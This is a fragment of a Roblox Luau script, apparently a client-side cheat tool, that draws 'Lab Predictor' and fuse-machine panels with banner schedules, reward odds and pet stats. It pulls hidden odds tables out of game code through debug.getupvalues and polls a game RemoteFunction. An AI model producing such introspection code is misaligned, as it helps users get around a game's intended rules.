		local n56 = math.max(1, n47 - n44 - n42 * 2)
		local n57 = 0

		for _, item164 in ipairs(list53) do
			if item164.Kind == "text" then
				local handle = item164.Handle
				local value507 = func603(handle, n47)

				if value507 then
					item164.Height = value507
				else
					flag500 = true
				end

				local n58 = math.max(1, item164.Height or 1)
				handle.Set({ X = 0, Y = n57 + (item164.Gap and 0.5 or 0), Width = n47, Height = n58 })
				n57 += n58 + n2 * 0.5 + (item164.Gap and 0.5 or 0)
			else
				local slot = item164.Slot
				local detail3 = func603(slot.Detail, n56)

				if detail3 then
					slot.DetailUnits = detail3
				else
					flag500 = true
				end

				local n58 = math.clamp(slot.DetailUnits or 1, 1, 4)
				local status3 = func602(slot.Status)

				if status3 then
					slot.StatusUnits = status3 + 0.23
				else
					flag500 = true
				end

				local n59 = math.min(n56 * 0.42, math.max(2.73, slot.StatusUnits or 2.73))
				local n60 = math.max(1, n56 - n59 - n45)
				local rarity6 = func602(slot.Rarity)

				if rarity6 then
					slot.RarityUnits = rarity6 + 0.1
				else
					flag500 = true
				end

				local n61 = math.min(slot.RarityUnits or 3, n60 * 0.5)
				local name5 = func602(slot.Name)

				if name5 then
					slot.NameUnits = name5 + 0.1
				else
					flag500 = true
				end

				local min = math.min
				local max = math.max
				local nameUnits = slot.NameUnits or 4
				local max2 = math.max
				local n62 = n60 - n61 - n45
				local num134 = min(max(1, nameUnits), max2(1, n62))
				local n63 = n43 * 2
				local n64 = math.max(n58 + n38, 2.3) + n63
				local n65 = (n64 - n58 - n38) / 2
				slot.Frame.Set({ X = 0, Y = n57, Width = n47, Height = n64 })
				slot.Icon.Set({ Y = (n64 - n41) / 2 })
				slot.Name.Set({ X = n42 + n44, Y = n65, Width = num134 })
				slot.Rarity.Set({ X = n42 + n44 + num134 + n45, Y = n65, Width = math.max(0.5, n61) })
				slot.Detail.Set({ X = n42 + n44, Y = n65 + n38, Width = n56, Height = n58 })
				slot.Status.Set({ X = n42 + n44 + n56 - n59, Y = n65, Width = math.max(0.5, n59) })
				n57 += n64 + n2
			end
		end

		local n58 = math.max(1, n57)

		if math.abs(n58 - n52) > 0.01 then
			n52 = n58
			obj80:SetContentLines(n58)
		end
	end
end

do
	local tbl469 = func2(function()
		return ReplicatedStorage.Data.ScrambleTradeIn
	end)

	local n4 = 30
	local tbl470 = { Biohazard = "#9DFF4D", Experimental = "#5AD8FF", UnstableDNA = "#FF6BD5" }
	local value508 = nil
	local flag598 = false
	local n5 = 0
	local tbl471 = { Banner = {}, Odds = {}, Chance = {}, Clears = 0 }

	local function func604(param334)
		return tbl470[tostring(param334)] or color.Text
	end

	local function func605(param335, ...)
		if type(tbl469) ~= "table" or type(tbl469[param335]) ~= "function" then
			return nil
		end
		local ok, result = pcall(tbl469[param335], ...)
		if ok then
			return result
		end
		return nil
	end

	local function func606(param336)
		return tostring(func605("GetBannerDisplayName", param336) or param336)
	end

	local function func607(param337)
		local BannerIdForPeriod = tbl471.Banner[param337]

		if BannerIdForPeriod == nil then
			BannerIdForPeriod = func605("BannerIdForPeriod", param337) or false
			tbl471.Banner[param337] = BannerIdForPeriod
		end

		return BannerIdForPeriod or nil
	end

	local function func608(param338)
		local value509, value510, value511 = ipairs(type(tbl469) == "table" and tbl469.Banners or {})
		local n6 = 0
		local n7 = 0

		for _, value512 in value509, value510, value511 do
			local n8 = tonumber(func605("GetBannerWeight", value512.Id)) or 0
			n6 += n8

			if value512.Id == param338 then
				n7 = n8
			end
		end

		return n6 > 0 and n7 / n6 * 100 or 0
	end

	local function func609(param339)
		local flag599 = tbl471.Chance[param339]

		if flag599 == nil then
			flag599 = func608(param339)
			tbl471.Chance[param339] = flag599
		end

		return flag599
	end

	local function func610(param340)
		local GetBanner = func605("GetBanner", param340)
		local tbl472 = {}
		local func611 = ipairs
		local pets = type(GetBanner) == "table" and GetBanner.Pets or {}
		local n6 = 0

		for _, pet in func611(pets) do
			local n7 = tonumber(func605("GetPetWeight", param340, pet.AssetId)) or 0

			if n7 > 0 then
				n6 += n7
				table.insert(tbl472, { AssetId = pet.AssetId, Weight = n7 })
			end
		end

		for _, item165 in ipairs(tbl472) do
			item165.Chance = n6 > 0 and item165.Weight / n6 * 100 or 0
		end

		table.sort(tbl472, function(param341, param342)
			return param341.Chance > param342.Chance
		end)

		return tbl472
	end

	local function func612(param343)
		local flag600 = tbl471.Odds[param343]

		if flag600 == nil then
			local value513 = func610(param343)
			tbl471.Odds[param343] = value513
			flag600 = value513
		end

		return flag600
	end

	local function func613(param344)
		local ok, result = pcall(os.date, "%I:%M %p", math.floor(param344))
		if not ok then
			return ""
		end
		return (string.gsub(tostring(result), "^0", ""))
	end

	local function func614(param345)
		local n6 = math.max(0, math.floor(param345))
		local n7 = math.floor(n6 / 86400)
		local n8 = math.floor(n6 % 86400 / 3600)
		local n9 = math.floor(n6 % 3600 / 60)
		if n7 > 0 then
			return string.format("%dd %dh %02dm", n7, n8, n9)
		end
		return string.format("%dh %02dm", n8, n9)
	end

	local function func615(param346)
		local income = param346 >= 10 and color.Income or param346 >= 1 and color.Clock or "#FF7A7A"
		local formatted19 = string.format(param346 >= 1 and "%.1f%%" or "%.2f%%", param346)
		return bold(paint(income, formatted19))
	end

	local function func616(num135)
		if num135 <= 0 then
			return ""
		end
		local n6 = 100 / num135
		return paint(color.Hint, n6 < 10 and string.format("1 in %.1f", n6) or string.format("1 in %d", math.floor(n6 + 0.5)))
	end

	local function func617(param347)
		if next(str1.Lab.Banners) ~= nil and str1.Lab.Banners[tostring(param347)] then
			return str39.Separator() .. bold(paint(color.Ready, "Your pick"))
		end
		return ""
	end

	local function func618()
		if flag598 or os.clock() < n5 then
			return
		end
		flag598 = true
		n5 = os.clock() + n4

		task.spawn(function()
			local rfScrambleTradeInAskState = networking:FindFirstChild("RF/ScrambleTradeIn/AskState")

			if rfScrambleTradeInAskState and rfScrambleTradeInAskState:IsA("RemoteFunction") then
				local ok, result = pcall(rfScrambleTradeInAskState.InvokeServer, rfScrambleTradeInAskState)

				if ok and type(result) == "table" then
					value508 = result
				end
			end

			flag598 = false
		end)
	end

	local function func619(flag601, num136, num137)
		local flag602 = flag601 ~= nil
		obj80:SetDock(flag602 and 5 or 0, { Gap = n2 })
		tbl314.Icon.Set({ Visible = flag602 })
		tbl314.Name.Set({ Visible = flag602 })
		tbl314.Rarity.Set({ Visible = flag602 })
		tbl314.Info.Set({ Visible = flag602 })
		if not flag602 then
			return
		end
		local value514 = func604(flag601)
		local GetBannerEggIcon = func605("GetBannerEggIcon", flag601)

		tbl314.Icon.Set({
			Visible = type(GetBannerEggIcon) == "string" and GetBannerEggIcon ~= "",
			Image = type(GetBannerEggIcon) == "string" and GetBannerEggIcon or "",
			StrokeColor = Color3.fromHex(value514),
		})

		tbl314.Name.Set({ Text = str39.Escape(func606(flag601)) })
		tbl314.Rarity.Set({ Text = "ACTIVE", Color = Color3.fromHex(color.Ready), Gradient = nil })
		local n6 = num137 - num136 % num137
		local num138 = bold(paint(color.Clock, "Ends in " .. str39.FormatClock(n6))) .. str39.Separator() .. paint(color.Text, func613(num136 + n6))
		local hint = paint(color.Hint, "Banner chance ") .. func615(func609(flag601))
		local tbl473 = { num138, hint }
		local value515 = value508

		if type(value515) == "table" and value515.BannerId == flag601 then
			if value515.Unlocked == false then
				table.insert(tbl473, paint("#FF7A7A", "Locked on this account"))
			else
				table.insert(tbl473, paint(color.Hint, "Pity ") .. bold(paint(color.Text, string.format("%s/%s", tostring(value515.PityCount or 0), tostring(value515.PityThreshold or 0)))) .. str39.Separator() .. paint(color.Hint, "Free rerolls ") .. bold(paint(color.Text, tostring(value515.FreeRefreshesRemaining or 0))))
			end
		end

		tbl314.Info.Set({ Text = table.concat(tbl473, "\n") })
	end

	local function func620()
		if not obj80 then
			return
		end
		n3 = 2
		table.clear(list53)
		local n6 = 0
		local n7 = 0

		local function func621(param348, param349)
			n6 += 1
			local value516 = func463(n6)
			value516.Set({ Visible = true, Text = param348 })
			table.insert(list53, { Kind = "text", Handle = value516, Gap = param349 })
		end

		local function func622(param350, param351)
			local len4 = #list53 > 0
			func621(string.format("<b><font color=\"%s\">%s</font></b>", param351, param350), len4)
		end

		local function func623()
			n7 += 1
			local value517 = func464(n7)
			value517.Frame.Set({ Visible = true })
			table.insert(list53, { Kind = "slot", Slot = value517 })
			return value517
		end

		local serverTimeNow = workspace:GetServerTimeNow()
		local n8 = tonumber(func605("RotationSeconds")) or 3600
		local n9 = math.floor(serverTimeNow / n8)

		if tbl471.Clears <= os.clock() then
			tbl471.Clears = os.clock() + 60
			table.clear(tbl471.Banner)
			table.clear(tbl471.Odds)
			table.clear(tbl471.Chance)
		end

		local flag603 = func607(n9)

		if type(tbl469) ~= "table" or flag603 == nil then
			func619(nil)
			func621(bold(paint(color.Hint, "Lab data is not available yet")), false)
		else
			func619(flag603, serverTimeNow, n8)
			local list67 = value508

			if type(list67) == "table" and list67.BannerId == flag603 and type(list67.Requirements) == "table" and #list67.Requirements > 0 then
				func622("CURRENT RECIPE", color.Text)
				local tbl474 = {}

				for _, requirement in ipairs(list67.Requirements) do
					local value518 = str39.AssetInfo(requirement)
					local insert = table.insert
					local packed5 = table.pack(bold(paint(value518.Hex, str39.Escape(value518.Name))))
					insert(tbl474, table.unpack(packed5, 1, packed5.n))
				end

				func621(table.concat(tbl474, str39.Separator()), false)
			end

			func622("REWARD ODDS" .. str39.Separator() .. string.upper(func606(flag603)), func604(flag603))
			local list68 = func612(flag603)

			for i, item166 in ipairs(list68) do
				local value519 = str39.AssetInfo(item166.AssetId)
				local result95 = func623()
				result95.Icon.Set({ Visible = value519.Icon ~= nil, Image = value519.Icon or "", StrokeColor = value519.Color })
				result95.Name.Set({ Text = str39.Escape(value519.Name) })

				result95.Rarity.Set({
					Text = string.upper(tostring(value519.Rarity)),
					Color = func460(value519),
					Gradient = func459(value519),
					GradientRotation = func461(value519),
				})

				result95.Status.Set({ Text = func615(item166.Chance) })
				local chance = func616(item166.Chance)

				if i == #list68 then
					chance ..= str39.Separator() .. bold(paint(color.Clock, "Chase pet"))
				end

				result95.Detail.Set({ Text = chance })
			end

			func622("UPCOMING LAB BANNERS", color.Text)

			for i = 1, 8 do
				local num139 = func607(n9 + i)
				local n10 = (n9 + i) * n8
				local result96 = func623()
				local GetBannerEggIcon = func605("GetBannerEggIcon", num139)
				local value520 = func604(num139)

				result96.Icon.Set({
					Visible = type(GetBannerEggIcon) == "string" and GetBannerEggIcon ~= "",
					Image = type(GetBannerEggIcon) == "string" and GetBannerEggIcon or "",
					StrokeColor = Color3.fromHex(value520),
				})

				result96.Name.Set({ Text = str39.Escape(func606(num139)) })
				result96.Rarity.Set({ Text = i == 1 and "NEXT" or "#" .. i, Color = Color3.fromHex(value520), Gradient = nil })
				result96.Status.Set({ Text = bold(paint(color.Clock, "in " .. func614(n10 - serverTimeNow))) })
				local list69 = func612(num139)
				local entry46 = list69[#list69]
				local hint2 = paint(color.Hint, "Starts ") .. paint(color.Text, func613(n10)) .. func617(num139)
				local str53

				if entry46 then
					local value521 = str39.AssetInfo(entry46.AssetId)
					str53 = hint2 .. str39.Separator() .. paint(color.Hint, "Chase ") .. bold(paint(value521.Hex, str39.Escape(value521.Name))) .. " " .. func615(entry46.Chance)
				else
					str53 = hint2
				end

				result96.Detail.Set({ Text = str53 })
			end

			func622("NEXT TIME EACH BANNER OPENS", color.Text)
			local func624 = ipairs
			local banners = tbl469.Banners or {}

			for _, banner in func624(banners) do
				local id5 = func604(banner.Id)
				local packed6 = table.pack(str39.Escape(func606(banner.Id)))
				local func625 = paint
				packed6.n = 2 + packed6.n - 1
				table.move(packed6, 1, packed6.n, 2, packed6)
				packed6[1] = id5
				local str54 = bold(func625(table.unpack(packed6, 1, packed6.n)))
				local str55

				if banner.Id == flag603 then
					str55 = str54 .. str39.Separator() .. bold(paint(color.Ready, "Open now"))
				else
					local value522 = nil

					for i = 1, 2000 do
						local id = banner.Id

						if func607(n9 + i) == id then
							value522 = i
							break
						else
							value522 = nil
						end
					end

					if value522 then
						local n10 = (n9 + value522) * n8
						str55 = str54 .. str39.Separator() .. bold(paint(color.Clock, "in " .. func614(n10 - serverTimeNow))) .. str39.Separator() .. paint(color.Text, func613(n10))
					else
						str55 = str54 .. str39.Separator() .. paint(color.Hint, "Not soon")
					end
				end

				func621(str55 .. str39.Separator() .. paint(color.Hint, "chance ") .. func615(func609(banner.Id)) .. func617(banner.Id), false)
			end
		end

		for i = n6 + 1, #list52 do
			list52[i].Set({ Visible = false })
		end

		for i = n7 + 1, #list51 do
			list51[i].Frame.Set({ Visible = false })
		end

		func465()
		n3 = 2
	end

	if not str39.Ready then
		obj78:CreateText({ Name = "Lab Predictor", Text = "Update the Chilli Library to use the predictor canvas." })
	else
		local obj98 = obj78:CreateCanvas({
			Name = "Lab Predictor",
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = 16,
				MaxLines = 34,
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = function(param352)
				func462(param352)
				pcall(func620)
			end,
		})

		func4(function()
			obj98:Destroy()
		end)

		local n6 = 1

		local connection = RunService.Heartbeat:Connect(function(deltaTime)
			if not obj80 or not str39.PageVisible() or not str39.IsShown(obj80:Root()) then
				return
			end
			func618()
			n6 += deltaTime

			if n6 >= 1 then
				n6 = 0
				pcall(func620)
			end

			if n3 > 0 or flag500 then
				if n3 > 0 then
					n3 -= 1
				end

				pcall(func465)
			end
		end)

		func4(function()
			connection:Disconnect()
		end)
	end
end

local paint2, bold2, color2, n4, n5, n6, n7, n8, n9, n10
local n11, n12

do
	local tbl475 = {
		{ min = 0.85, max = 1.05, weight = 2000 },
		{ min = 1.45, max = 1.55, weight = 250 },
		{ min = 1.9, max = 2.1, weight = 125 },
		{ min = 2.85, max = 3.15, weight = 62.5 },
		{ min = 3.8, max = 4.2, weight = 31.25 },
		{ min = 0.3, max = 0.45, weight = 18 },
		{ min = 0.1, max = 0.2, weight = 5 },
		{ min = 5.8, max = 6.2, weight = 15.625 },
		{ min = 9.5, max = 12.5, weight = 3 },
		{ min = 12, max = 17, weight = 0.05 },
		{ min = 20, max = 35, weight = 0.0001 },
	}

	paint2 = str39.Paint
	bold2 = str39.Bold
	color2 = str39.Color
	n4 = 5
	n5 = n4 + 0.8
	n6 = 1.2
	n7 = 1.2
	n8 = 0.936
	n9 = 2.3
	n10 = 0.25
	n11 = 0.18
	local n13 = n9 + 0.6
	local n14 = 0.24
	n12 = 0.22
	local n15 = 0.0909
	local value523 = nil
	local tbl476 = {}
	local tbl477 = {}
	local tbl478 = {}
	local tbl479 = {}
	local n16 = 0
	local n17 = 0
	local n18 = 0.06
	local n19 = -1
	local n20 = -1
	local n21 = -1
	local n22 = 4
	local n23 = 3
	local flag604 = false
	local n24 = 0
	local value524 = nil

	local tbl480 = {
		{ Min = 0, Color = "#8F98A8" },
		{ Min = 0.3, Color = "#C6CDDA" },
		{ Min = 0.85, Color = "#FFFFFF" },
		{ Min = 1.45, Color = "#7CFF9E" },
		{ Min = 1.9, Color = "#4FE0FF" },
		{ Min = 2.85, Color = "#6FA0FF" },
		{ Min = 3.8, Color = "#C08BFF" },
		{ Min = 5.8, Color = "#FF9A3D" },
		{ Min = 9.5, Color = "#FF5C5C" },
		{ Min = 12, Color = "#FFD34D" },
		{ Min = 20, Color = "#FF4DE8" },
	}

	local function func626(num140)
		local n25 = -math.huge
		local str56 = "#FFFFFF"

		for _, item167 in ipairs(tbl480) do
			if num140 + 0.001 >= item167.Min and item167.Min > n25 then
				str56 = item167.Color
				n25 = item167.Min
			end
		end

		return str56
	end

	local function func627(param353, param354)
		local eggRecords = tbl1.EggRecords
		if type(eggRecords) ~= "table" or type(eggRecords.WeightKgForScale) ~= "function" then
			return nil
		end
		local ok, result = pcall(eggRecords.WeightKgForScale, param353, param354)
		if ok and type(result) == "number" and result > 0 then
			return result
		end
		return nil
	end

	local function func628(list70)
		if type(list70) ~= "table" or #list70 == 0 then
			return nil
		end
		local n25 = -math.huge
		local value525 = nil

		for _, item168 in ipairs(list70) do
			local flag605 = str39.MutationMultiplier({ item168 })

			if flag605 > n25 then
				n25 = flag605
				value525 = item168
			end
		end

		return value525
	end

	local function func629()
		if value524 then
			return value524
		end
		local eggRecords = tbl1.EggRecords
		local getupvalues_ = type(debug) == "table" and debug.getupvalues or getupvalues

		if type(eggRecords) == "table" and type(eggRecords.DrawAssetScale) == "function" and type(getupvalues_) == "function" then
			local ok, result = pcall(getupvalues_, eggRecords.DrawAssetScale)

			if ok and type(result) == "table" then
				for _, value526 in pairs(result) do
					if type(value526) == "table" and type(value526[1]) == "table" and value526[1].min and value526[1].weight then
						value524 = value526
						break
					end
				end
			end
		end

		value524 = value524 or tbl475
		return value524
	end

	local function func630(tbl481, num141, num142)
		local fuseKernel = tbl1.FuseKernel

		if type(fuseKernel) == "table" and type(fuseKernel.BandWeightBias) == "function" then
			local ok, result = pcall(fuseKernel.BandWeightBias, tbl481, num141, num142)
			if ok and type(result) == "number" then
				return result
			end
		end

		return math.exp(math.log((tbl481[1] + tbl481[2] + tbl481[3]) / 3) / 0.69314718055994529 * math.log((num141 + num142) / 2) / 0.69314718055994529 * 0.6)
	end

	local function func631()
		local save = tbl1.Save
		if type(save) ~= "table" or type(save.Get) ~= "function" then
			return nil
		end
		local ok, result = pcall(save.Get)
		if not ok or type(result) ~= "table" then
			return nil
		end
		local fusionSlots = type(result.FusionSlots) == "table" and result.FusionSlots or {}
		local inventory = type(result.Inventory) == "table" and result.Inventory or {}
		local tbl482 = {}

		for i = 1, 3 do
			local entry47 = fusionSlots[i]
			local flag606 = entry47 ~= nil and inventory[entry47] or nil

			if type(flag606) == "table" then
				table.insert(tbl482, {
					Category = flag606.Category,
					Scale = tonumber(flag606.Scale) or 1,
					Mutations = type(flag606.Mutations) == "table" and flag606.Mutations or {},
				})
			end
		end

		return {
			Items = tbl482,
			Locked = result.FusionLocked == true,
			Duration = tonumber(result.FusionDuration) or 0,
			Reward = result.FusionEggReward ~= nil and result.FusionEggReward ~= false,
		}
	end

	local function func632(param355)
		if string.upper(tostring(param355.Rarity)) == "SECRET" then
			return str39.SecretGradient
		end
		return param355.Gradient
	end

	local function func633(param356)
		return func632(param356) ~= nil and Color3.fromRGB(255, 255, 255) or param356.Color
	end

	local function func634(param357)
		if string.upper(tostring(param357.Rarity)) == "SECRET" then
			return str39.SecretRotation
		end
		return nil
	end

	local function func635(obj99)
		value523 = obj99
		obj99:SetDock(5, { Gap = n12, DividerColor = Color3.fromRGB(170, 174, 184) })
		local value527 = obj99:Dock()

		tbl476.Icon = obj99:Image({
			Parent = value527,
			X = 0,
			Y = 0,
			Width = n4,
			Height = n4,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.26,
			StrokeThickness = n15,
			StrokeTransparency = 0,
			ZIndex = 8,
		})

		tbl476.Name = obj99:Text({
			Parent = value527,
			X = n5,
			Y = 0,
			Height = n6,
			Scale = n7,
			Wrap = false,
			Gradient = str39.NameGradient,
			TextStrokeTransparency = 1,
			ZIndex = 9,
		})

		tbl476.Rarity = obj99:Text({
			Parent = value527,
			X = n5,
			Y = 0,
			Height = n6,
			Scale = n8,
			Wrap = false,
			Font = str39.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			ZIndex = 9,
		})

		tbl476.Info = obj99:Text({ Parent = value527, X = n5, Y = n6, Height = n4 - n6, Wrap = false, ZIndex = 9 })

		obj99:OnResize(function(param358, num143, flag607)
			if num143 == n19 and flag607 == n20 then
				return
			end
			n19 = num143
			n20 = flag607
			n16 = num143 / math.max(flag607, 1)
			n17 = flag607
			n24 = 2
			n18 = 0.9 / math.max(obj99:TextSize(), 1)
			tbl476.Rarity.Set({ StrokeThickness = n18 })

			for _, item169 in ipairs(tbl477) do
				item169.Rarity.Set({ StrokeThickness = n18 })
			end
		end)
	end

	local function func636(flag608)
		local flag609 = flag608 and flag608.Get()
		if not flag609 or n17 <= 0 then
			return nil
		end

		if flag609.Text ~= tostring(flag608.Spec.Text or "") then
			return nil
		end
		return flag609
	end

	local function func637(param359)
		local flag610 = func636(param359)
		if not flag610 then
			return nil
		end
		local size = flag610.Size
		local textWrapped = flag610.TextWrapped
		flag610.TextWrapped = false
		flag610.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
		local x = flag610.TextBounds.X
		flag610.Size = size
		flag610.TextWrapped = textWrapped
		if x <= 0 then
			return nil
		end
		return x / n17
	end

	local function func638(param360, num144)
		local flag611 = func636(param360)
		if not flag611 then
			return nil
		end
		local size = flag611.Size
		flag611.Size = UDim2.fromOffset(math.max(1, math.floor(num144 * n17 + 0.5)), 100000)
		local y = flag611.TextBounds.Y
		flag611.Size = size
		if y <= 0 then
			return nil
		end
		return y / n17
	end

	local function func639(param361)
		local entry48 = tbl478[param361]

		if not entry48 then
			local value528 = value523:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
			tbl478[param361] = value528
			entry48 = value528
		end

		return entry48
	end

	local function func640(param362)
		local entry49 = tbl477[param362]
		if entry49 then
			return entry49
		end

		local tbl483 = {
			Frame = value523:Frame({
				Name = "Slot",
				Background = "#000000",
				BackgroundTransparency = 0.74,
				Corner = 0.35,
				X = 0,
				Y = 0,
				Width = 1,
				Height = 1,
				Visible = false,
			}),
		}

		tbl483.Icon = value523:Image({
			Parent = tbl483.Frame,
			X = n10,
			Y = 0,
			Width = n9,
			Height = n9,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.45,
			StrokeThickness = n15,
			StrokeTransparency = 0,
		})

		tbl483.Name = value523:Text({
			Parent = tbl483.Frame,
			X = n10 + n13,
			Y = 0,
			Width = 1,
			Height = n6,
			Scale = n7,
			Wrap = false,
			Gradient = str39.NameGradient,
			TextStrokeTransparency = 1,
		})

		tbl483.Rarity = value523:Text({
			Parent = tbl483.Frame,
			X = n10 + n13,
			Y = 0,
			Width = 1,
			Height = n6,
			Scale = n8,
			Wrap = false,
			Font = str39.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			StrokeThickness = n18,
		})

		tbl483.Detail = value523:Text({
			Parent = tbl483.Frame,
			X = n10 + n13,
			Y = n6,
			Width = math.max(1, n16 - n13 - n10 * 2),
			Height = 1,
			Wrap = true,
		})

		tbl483.Status = value523:Text({
			Parent = tbl483.Frame,
			X = 0,
			Y = 0,
			Width = 1,
			Height = n6,
			Wrap = false,
			Align = "Right",
			Color = color2.Hint,
		})

		tbl477[param362] = tbl483
		return tbl483
	end

	local function func641()
		if n16 <= 0 then
			return
		end
		flag604 = false
		local n25 = math.max(1, n16 - n5)
		local rarity7 = func637(tbl476.Rarity)

		if rarity7 then
			n23 = rarity7 + 0.1
		else
			flag604 = true
		end

		local name6 = func637(tbl476.Name)

		if name6 then
			n22 = math.min(name6 + 0.1, math.max(1, n25 - n23 - n14))
		else
			flag604 = true
		end

		tbl476.Name.Set({ X = n5, Y = 0, Width = n22, Height = n6 })

		tbl476.Rarity.Set({
			X = n5 + n22 + n14,
			Y = 0,
			Width = math.max(0.5, math.min(n23, n25 - n22 - n14)),
			Height = n6,
		})

		tbl476.Info.Set({ X = n5, Y = n6, Width = n25, Height = math.max(1, n4 - n6) })
		local n26 = math.max(1, n16 - n13 - n10 * 2)
		local n27 = 0

		for _, item170 in ipairs(tbl479) do
			if item170.Kind == "text" then
				local handle = item170.Handle
				local value529 = func638(handle, n16)

				if value529 then
					item170.Height = value529
				else
					flag604 = true
				end

				local n28 = math.max(1, item170.Height or 1)
				handle.Set({ X = 0, Y = n27 + (item170.Gap and 0.5 or 0), Width = n16, Height = n28 })
				n27 += n28 + n12 * 0.5 + (item170.Gap and 0.5 or 0)
			else
				local slot = item170.Slot
				local detail4 = func638(slot.Detail, n26)

				if detail4 then
					slot.DetailUnits = detail4
				else
					flag604 = true
				end

				local n28 = math.clamp(slot.DetailUnits or 1, 1, 4)
				local status4 = func637(slot.Status)

				if status4 then
					slot.StatusUnits = status4 + 0.23
				else
					flag604 = true
				end

				local n29 = math.min(n26 * 0.42, math.max(2.73, slot.StatusUnits or 2.73))
				local n30 = math.max(1, n26 - n29 - n14)
				local rarity8 = func637(slot.Rarity)

				if rarity8 then
					slot.RarityUnits = rarity8 + 0.1
				else
					flag604 = true
				end

				local n31 = math.min(slot.RarityUnits or 3, n30 * 0.5)
				local name7 = func637(slot.Name)

				if name7 then
					slot.NameUnits = name7 + 0.1
				else
					flag604 = true
				end

				local min = math.min
				local max = math.max
				local nameUnits = slot.NameUnits or 4
				local max2 = math.max
				local n32 = n30 - n31 - n14
				local num145 = min(max(1, nameUnits), max2(1, n32))
				local n33 = n11 * 2
				local n34 = math.max(n28 + n6, 2.3) + n33
				local n35 = (n34 - n28 - n6) / 2
				slot.Frame.Set({ X = 0, Y = n27, Width = n16, Height = n34 })
				slot.Icon.Set({ Y = (n34 - n9) / 2 })
				slot.Name.Set({ X = n10 + n13, Y = n35, Width = num145 })
				slot.Rarity.Set({ X = n10 + n13 + num145 + n14, Y = n35, Width = math.max(0.5, n31) })
				slot.Detail.Set({ X = n10 + n13, Y = n35 + n6, Width = n26, Height = n28 })
				slot.Status.Set({ X = n10 + n13 + n26 - n29, Y = n35, Width = math.max(0.5, n29) })
				n27 += n34 + n12
			end
		end

		local n28 = math.max(1, n27)

		if math.abs(n28 - n21) > 0.01 then
			n21 = n28
			value523:SetContentLines(n28)
		end
	end

	local function func642(flag612, list71)
		local flag613 = flag612 ~= nil
		value523:SetDock(flag613 and 5 or 0, { Gap = n12 })
		tbl476.Icon.Set({ Visible = flag613 })
		tbl476.Name.Set({ Visible = flag613 })
		tbl476.Rarity.Set({ Visible = flag613 })
		tbl476.Info.Set({ Visible = flag613 })
		if not flag613 then
			return
		end
		tbl476.Icon.Set({ Visible = flag612.Icon ~= nil, Image = flag612.Icon or "", StrokeColor = flag612.Color })
		tbl476.Name.Set({ Text = str39.Escape(flag612.Name) })

		tbl476.Rarity.Set({
			Text = string.upper(tostring(flag612.Rarity)),
			Color = func633(flag612),
			Gradient = func632(flag612),
			GradientRotation = func634(flag612),
		})

		local text3 = paint2(color2.Text, string.format("Fusing %d of 3 pets", #list71.Items))

		if list71.Reward then
			text3 = bold2(paint2(color2.Ready, "Fuse finished, claim your egg"))
		elseif list71.Locked then
			local n25 = list71.Duration > 1e9 and list71.Duration - workspace:GetServerTimeNow() or 0
			text3 = bold2(paint2(color2.Clock, n25 > 0 and "Fusing" .. str39.Separator() .. str39.FormatClock(n25) or "Fusing"))
		end

		local set = tbl476.Info.Set
		local tbl484 = {}
		local concat = table.concat
		local value530 = bold2(paint2(color2.Income, str39.FormatRate(str39.Income(flag612, list71.Items[1].Scale, list71.Items[1].Mutations))))
		local text4 = paint2(color2.Text, string.format("%d/3 loaded", #list71.Items))
		local tbl485 = { value530, text4, text3 }
		tbl484.Text = concat(tbl485, "\n")
		set(tbl484)
	end

	local function refreshFuse()
		if not value523 then
			return
		end
		n24 = 2
		table.clear(tbl479)
		local n25 = 0

		local function func643(param363, param364)
			n25 += 1
			local value531 = func639(n25)
			value531.Set({ Visible = true, Text = param363 })
			table.insert(tbl479, { Kind = "text", Handle = value531, Gap = param364 })
		end

		local function func644(param365, param366)
			local len5 = #tbl479 > 0
			func643(string.format("<b><font color=\"%s\">%s</font></b>", param366, param365), len5)
		end

		local result97 = func631()
		local n26

		if not result97 then
			func642(nil, nil)
			func643(bold2(paint2(color2.Hint, "Fuse machine data is not available yet")), false)
			n26 = 0
		elseif #result97.Items == 0 then
			func642(nil, nil)
			func643(bold2(paint2(color2.Text, "Machine is empty")), false)
			func643(paint2(color2.Hint, "Load 3 pets of the same species to see the result odds"), false)
			n26 = 0
		else
			local items = result97.Items
			local value532 = str39.AssetInfo(items[1].Category)
			func642(value532, result97)
			local text = color2.Text
			func644(string.format("FUSE MACHINE STATUS (%d/3 PETS)", #items), text)
			func643(paint2(color2.Hint, "Species") .. "  " .. bold2(paint2(value532.Hex, "[" .. string.upper(tostring(value532.Rarity)) .. "]")) .. " " .. bold2(paint2(color2.Text, str39.Escape(value532.Name))), false)
			n26 = 0

			for i = 1, 3 do
				local entry50 = items[i]
				n26 += 1
				local value533 = func640(n26)
				value533.Frame.Set({ Visible = true })
				value533.Status.Set({ Text = "SLOT " .. i })

				if entry50 then
					value533.Icon.Set({ Visible = value532.Icon ~= nil, Image = value532.Icon or "", StrokeColor = value532.Color })
					value533.Name.Set({ Text = str39.Escape(value532.Name) })

					value533.Rarity.Set({
						Text = string.upper(tostring(value532.Rarity)),
						Color = func633(value532),
						Gradient = func632(value532),
						GradientRotation = func634(value532),
					})

					local category7 = func627(entry50.Category, entry50.Scale)
					local str57 = bold2(paint2(color2.Scale, string.format("%.2fx", entry50.Scale)))

					if category7 then
						str57 ..= str39.Separator() .. paint2(color2.Weight, str39.FormatWeight(category7))
					end

					local separat = str57 .. str39.Separator() .. bold2(paint2(color2.Income, str39.FormatRate(str39.Income(value532, entry50.Scale, entry50.Mutations))))
					local flag614 = str39.MutationText(entry50.Mutations)

					value533.Detail.Set({
						Text = separat .. str39.Separator() .. (flag614 ~= "" and flag614 or paint2(color2.Hint, "Normal")),
					})
				else
					value533.Icon.Set({ Visible = false })
					value533.Name.Set({ Text = paint2(color2.Hint, "Empty") })
					value533.Rarity.Set({ Text = "", Gradient = nil })
					value533.Detail.Set({ Text = paint2(color2.Hint, "Add a pet to this slot") })
				end

				table.insert(tbl479, { Kind = "slot", Slot = value533 })
			end

			local n27 = 0

